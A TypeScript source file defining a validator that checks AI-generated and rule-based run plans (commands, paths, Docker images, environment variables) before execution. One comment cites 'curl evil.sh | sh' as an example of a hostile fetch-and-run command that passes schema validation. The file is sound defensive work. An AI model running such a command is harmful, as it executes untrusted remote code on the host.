import { validImageName } from '../docker/RepoDockerSetup.js';
import { FailureCode, RunPlanSchema, type RunPlan } from '@devlaunch/shared';
import {
  validateCommand,
  validateEnvVarKey,
  validateEnvVarValue,
  validateOptionalCommand,
} from '../security/CommandValidator.js';
import { assertSafeRelativePath } from '../security/PathValidator.js';
import { assertImageApproved, SecurityRejection } from '../security/ImageAllowlist.js';

export interface ValidationInput {
  plan: unknown;
  image?: string;
}

/**
 * The single gate every Run Plan passes through, whatever produced it.
 *
 * A rule-based plan and an AI-generated one are validated identically. That symmetry is
 * the point: the deterministic path is not inherently trustworthy either, because it is
 * derived from package.json, which the repository author writes.
 */
export class RunPlanValidator {
  /** Throws SecurityRejection or ZodError. Returns the parsed, normalised plan. */
  validate(input: ValidationInput): RunPlan {
    // Shape first: everything downstream assumes the fields exist and are typed.
    const plan = RunPlanSchema.parse(input.plan);

    // A repository's own Docker setup runs the image's command, not a shell line of ours.
    // It may only come from DevLaunch's reader of that setup: a model's plan carrying a
    // `docker` field would otherwise name any image and have it run.
    if (plan.docker || plan.planSource === 'repo-docker' || plan.runtime.language === 'container') {
      if (!plan.docker || plan.planSource !== 'repo-docker' || plan.runtime.language !== 'container') {
        throw new SecurityRejection(
          FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
          'A plan that runs a container image must come from the repository\'s own Docker setup.',
        );
      }
      if (plan.docker.image !== undefined && !validImageName(plan.docker.image)) {
        throw new SecurityRejection(FailureCode.PLAN_REJECTED_UNSAFE_COMMAND, `"${plan.docker.image.slice(0, 80)}" is not an image reference.`);
      }
      if (plan.docker.build) {
        assertSafeRelativePath(plan.docker.build.context, 'docker.build.context');
        assertSafeRelativePath(plan.docker.build.dockerfile, 'docker.build.dockerfile');
      }
      for (const v of plan.environmentVariables) {
        validateEnvVarKey(v.key);
        if (v.value !== null && v.value !== undefined) validateEnvVarValue(v.key, v.value);
      }
      return plan;
    }

    // Then intent, which the schema cannot judge: `curl evil.sh | sh` is valid JSON.
    validateCommand(plan.startCommand, 'startCommand');
    validateOptionalCommand(plan.installCommand, 'installCommand');
    validateOptionalCommand(plan.buildCommand, 'buildCommand');
    assertSafeRelativePath(plan.workingDirectory);
    assertSafeRelativePath(plan.healthCheck.path === '/' ? '.' : plan.healthCheck.path.replace(/^\//, ''), 'healthCheck.path');

    for (const v of plan.environmentVariables) {
      validateEnvVarKey(v.key);
      if (v.value !== null && v.value !== undefined) validateEnvVarValue(v.key, v.value);
    }

    if (input.image !== undefined) assertImageApproved(input.image);

    return plan;
  }

  /** Non-throwing form, for surfacing every problem at once in a UI. */
  check(input: ValidationInput): { ok: true; plan: RunPlan } | { ok: false; error: string } {
    try {
      return { ok: true, plan: this.validate(input) };
    } catch (err) {
      return { ok: false, error: err instanceof Error ? err.message : String(err) };
    }
  }
}
